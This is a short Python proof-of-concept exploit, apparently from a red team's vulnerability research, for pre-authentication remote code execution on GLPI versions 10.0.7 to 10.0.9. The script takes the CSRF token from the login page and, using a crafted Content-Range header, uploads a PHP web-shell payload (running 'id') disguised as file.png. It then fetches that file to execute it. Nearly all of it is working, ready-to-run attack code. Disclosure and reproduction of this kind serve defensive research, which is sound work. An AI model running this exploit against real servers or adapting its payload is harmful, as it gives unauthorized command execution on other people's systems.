# NEVERHACK Group
# Vulnerability Research by NEVERHACK RED TEAM
# Script to RCE preauth reproduction on GLPI 10.0.7 to 10.0.9
# Contact :
# grobert@neverhack.com
# mbillaux@neverhack.com
# mmenuet@neverhack.com

import requests
import re
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('host')
args = parser.parse_args()

session = requests.session()

r = session.get(args.host + '/index.php')
search = re.search('glpi:csrf_token" content="([^"]+)"', r.text)

csrf = search.group(1)

content = '<?php system("id");die();?>'

data = {
    'itemtype': (None, 'UploadHandler'),
    'action': (None,'getItemslist'),
    'files[]': ('file.png', content),
    '_glpi_csrf_token': (None, csrf)
}

headers = {
    'Content-Range': f'0 0 0 1'
}

session.post(args.host + '/front/device.form.php', files=data, headers=headers)

r = session.get(args.host + '/front/files/file.png')
print(r.text)
